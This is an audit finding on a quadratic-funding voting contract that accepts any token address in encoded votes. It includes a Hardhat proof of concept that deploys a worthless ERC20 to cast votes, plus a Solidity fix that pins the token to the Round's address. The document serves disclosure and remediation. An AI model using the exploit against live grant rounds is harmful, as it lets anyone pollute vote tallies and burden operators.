# Anyone can deploy worthless tokens and use them to vote

## Summary
 Anyone can deploy worthless tokens and use them to vote because the token address is sent inside the encodedVotes.

## Vulnerability Detail
I deployed my own ERC20 and used this address to vote, sending it inside the encodedVotes.

Because the QuadraticFundingVotingStrategyImplementation contract doesn't check if the address used for voting is the same as in the Round contract, it emits the event Voted.

In this way, I voted for a project with a worthless token.

**Proof of concept:**
```typescript
  // Deploy new ERC20
  const worthlessERC20 = await MockERC20Factory.connect(player).deploy(1_000_000);
  await worthlessERC20.connect(player).approve(votingStrategy.address, 1_000_000);
  
  const voteTx = await round.connect(player).vote([
       ethers.utils.defaultAbiCoder.encode(
          ["address", "uint256", "address", "bytes32"],
          [
              // Use the token I just created to vote
              worthlessERC20.address,
              1_000_000,
              round.address,
              ethers.utils.hexZeroPad(projectID.toHexString(), 32),
          ]
      )
  ]);

  await expect(voteTx).to.emit(
      votingStrategy, 'Voted'
  ).withArgs(
      // Votes were cast with my token
      worthlessERC20.address,
      1_000_000,
      player.address,
      round.address,
      projectID,
      round.address
  );

  // Now Round contract has my tokens
  expect(await worthlessERC20.balanceOf(round.address)).to.equal(1_000_000);

  await ethers.provider.send("evm_mine", [_currentBlockTimestamp + 1_000]);

  await round.connect(roundOperator).setReadyForPayout();

  // But the Round contract can't even send them to PayoutStrategy contract when the round ends
  expect(await worthlessERC20.balanceOf(round.address)).to.equal(1_000_000);
  expect(await worthlessERC20.balanceOf(payoutStrategy.address)).to.equal(0);

```

## Impact
Although the vote count is done off-chain, anyone can mess it up, and the round operator that calculates them will have the additional work of looking to see if someone used this fraudulent maneuver to vote.

## Tool used

Manual Review, Hardhat

## Recommendation
Users should not be able to send any token address within encodedData, but the token to use must be set according to the token address within the Round contract.

**IVotingStrategy.sol**
Add a tokenAddress variable inside IVotingStrategy.sol and when the initialize() function is called set it to the value inside the token variable within the Round contract:

```solidity
    /// @notice Round address
    address public roundAddress;

+   address public tokenAddress;
```

```solidity
function init() external {
    require(roundAddress == address(0), "init: roundAddress already set");
    roundAddress = msg.sender;

+   tokenAddress = RoundImplementation(roundAddress).token();
}
```
**QuadraticFundingVotingStrategyImplementation.sol**

Remove any reference to _votes from encodedVotes and use tokenAddress instead:
```solidity
function vote(bytes[] calldata encodedVotes, address voterAddress) external override payable nonReentrant isRoundContract {

    for (uint256 i = 0; i < encodedVotes.length; i++) {

      (
-       address _token,
        uint256 _amount,
        address _grantAddress,
        bytes32 _projectId
      ) = abi.decode(encodedVotes[i], (
-       address,
        uint256,
        address,
        bytes32
      ));

-     if (_token == address(0)) {
+     if (tokenAddress == address(0)) {
        AddressUpgradeable.sendValue(payable(_grantAddress), _amount);
      } else {
        SafeERC20Upgradeable.safeTransferFrom(
 -        IERC20Upgradeable(_token),
 +        IERC20Upgradeable(tokenAddress),
          voterAddress,
          _grantAddress,
          _amount
        );

      }

      emit Voted(
 -      _token,
 +      tokenAddress,
        _amount,
        voterAddress,
        _grantAddress,
        _projectId,
        msg.sender
      );

    }

  }
```
